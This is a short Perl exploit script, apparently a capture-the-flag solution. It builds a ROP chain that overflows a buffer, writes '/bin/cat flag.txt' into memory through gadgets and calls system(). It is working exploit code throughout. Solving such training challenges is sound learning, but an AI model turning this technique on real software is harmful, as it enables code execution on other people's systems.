$PADDING  = "B"x40;
$BSS      = "\x60\x10\x60\x00" . "\0"x4; # BSS section
$CALLSYS  = "\x10\x08\x40\x00" . "\0"x4; # call to system() in 'usefulFunction'
$SETREGS  = "\x90\x08\x40\x00" . "\0"x4; # gagdget that pops into r14 and r15
$POPRDI   = "\x93\x08\x40\x00" . "\0"x4; # gadget 'pop rdi; ret'
$WRITEMEM = "\x20\x08\x40\x00" . "\0"x4; # 'usefulGadgets'

sub write_bytes
{
	my ($addr, $string) = @_;

	my $mod = (length $string) % 8;
	if ($mod ne 0) {
		$string .= "\x00" x (8 - $mod);
	}

	my $rop = "";
	for my $str (unpack("(a8)*", $string))
	{
		$rop  .= $SETREGS . pack("Q", $addr) . $str . $WRITEMEM;
		$addr += 8;
	}

	$rop;
}

print $PADDING
	. write_bytes(0x601060, "/bin/cat flag.txt\0")
	. $POPRDI . $BSS
	. $CALLSYS;
